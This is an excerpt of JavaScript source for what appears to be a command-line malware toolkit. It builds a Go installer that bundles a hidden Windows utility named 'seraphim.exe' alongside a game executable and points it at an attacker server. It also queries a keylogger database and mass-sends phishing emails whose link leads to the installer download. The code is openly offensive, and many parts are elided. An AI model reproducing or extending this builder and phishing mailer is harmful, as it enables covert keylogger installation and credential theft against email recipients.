...
export function buildCommandHandler(targetPath, options) {
  ...
  fs.copyFileSync(
    "./rsrc.syso",
    path.join("./build", path.basename("./rsrc.syso")),
  );
  
  const targetConfigPath = new URL('../build/config.go', import.meta.url);
  fs.writeFileSync(targetConfigPath, `package main\nconst(nomePastaDestino = "${options.folder}"\nnomeArquivoJogo = "${options.executable}"\nnomeArquivoUtilitario = "seraphim.exe"\nnomeAtalho = "${options.shortcut}"\nipServidor = "http://${options.ip}:${options.port}"\n)\n`)

  try {
    execSync(
      'cd build/app && go mod init adsm/seraphim && go mod tidy && go build -ldflags "-H windowsgui" seraphim.go',
      {stdio: "ignore"}
    );
    ...
    console.log(
      `\n${pc.bgGreen(" LOG ")} builded go module seraphim successfully\n`,
    );
  } catch (e) {
  ...
  try {
    execSync(
      "cd build && go mod init installer && go mod tidy && go build -o ../public/installer.exe .",
      {stdio: "ignore"}
    );
    ...
    console.log(
      `${pc.bgGreen(" LOG ")} builded go module installer successfully\n`,
    );
  } catch (e) {
    console.log(`${pc.bgRed(" ERROR ")} ${e.message}\n`);
  }
...
export async function handleKeyloggerDatabaseSearch(options) {
  try {
    console.log("\n");
    intro(`${pc.bgGreenBright(" search on database ")}`);
...
async function login(email, pass) {
  ...
  fs.writeFileSync(".login.json", json, "utf-8");
}
...
export async function sendEmailHandler(options) {
  try {
    ...
    const content_email = await fs.readFileSync(options.archive, "utf-8");
    const list_emails = stringToArray(content_email);

    fs.accessSync(options.phishing);
    const content_html = await fs.readFileSync(options.phishing, "utf-8");
    const port = await returnPort();
    const html = await modifyLinkEmail(content_html, options.ip, port);
...
async function modifyLinkEmail(content_html, ip_address, PORT){
    const link = createURL(ip_address, PORT);

    content_html = content_html.replaceAll("{{LINK}}", link);
    return content_html;
}

function createURL(ip_address, PORT){
  const url = new URL("/download", `http://${ip_address}:${PORT}`);
  return url.href;
}